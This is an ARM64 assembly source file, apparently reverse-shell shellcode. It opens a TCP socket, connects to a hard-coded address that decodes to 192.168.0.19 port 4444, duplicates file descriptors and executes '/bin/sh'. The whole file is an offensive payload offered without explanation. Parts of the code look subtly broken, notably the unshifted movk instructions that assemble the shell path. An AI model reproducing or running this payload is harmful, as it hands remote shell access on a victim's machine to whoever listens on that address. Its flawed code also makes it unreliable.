;//////////Codigo por Belial Grimoire////////////

.arch armv8-a
.global _start


.text

_start:

mov x8, 198
mov x2, 0
mov x1, 1
mov x0, 2
svc 0

mov w3, w0

mov x8, 203
mov x2, 16

movz x1, 0x2
movk x1, 0x5c11, lsl 16
movk x1, 0xa8c0, lsl 32
movk x1, 0x1300, lsl 48

str x1, [sp, -16]!
mov x1, sp
svc 0

mov x1, 3

jp_dup:
mov x8, 24
svc 0
sub x1, x1, 1
bne jp_dup

mov x8, 221
movz x1, 0x622f
movk x1, 0x6e69
movk x1, 0x732f
movk x1, 0x0068
str x1, [sp, -16]!
mov x0, sp

svc 0

